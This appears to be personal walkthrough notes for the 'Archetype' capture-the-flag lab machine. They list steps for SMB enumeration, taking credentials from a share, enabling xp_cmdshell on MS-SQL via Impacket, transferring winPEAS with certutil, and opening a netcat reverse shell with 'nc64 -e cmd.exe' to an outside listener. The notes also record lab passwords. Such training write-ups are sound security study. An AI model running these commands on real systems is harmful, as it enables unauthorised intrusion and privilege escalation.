---
created: 2022-06-10T00:45:16+10:00
updated: 2022-08-29T01:02:02+10:00
---
# Archetype
1. Which TCP port is hosting a database server?
    - `1433` - ms-sql
2. What is the name of the non-Administrative share available over [[smb|SMB]]?
    - `backups`
3. What is the password identified in the file on the SMB share?
    - `M3g4c0rp123`
4. What script from Impacket collection can be used in order to establish an authenticated connection to a [[mssql|Microsoft SQL Server]]?
    - `mssqlclient.py`
    - or probably `impacket-mssqlclient`
    - `user:pass@host` but also needed `-windows-auth`
5. What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?
    - `xp_cmdshell`
        - must enable
        - `sp_configure 'show advanced options', 1`
        - `reconfigure`
        - `sp_configure 'xp_cmdshell', 1`
        - `reconfigure`
        - oh... apparently `enable_xp_cmdshell` exists in this client
6. What script can be used in order to search possible paths to escalate privileges on Windows hosts?
    - `winpeas`
    - [[winpeas]]
    - had to download locally, then serve it over http, and then download with certutil/wget
    - also served nc64/netcat/whatever
    - ran `nc64 -e cmd.exe myhost port`
    - and `nc -lvnp port` 
7. What file contains the administrator's password?
    - `ConsoleHost_history.txt`
    - `MEGACORP_4dm1n!!`
8. Submit user flag
    - 
9. Submit root flag
    - 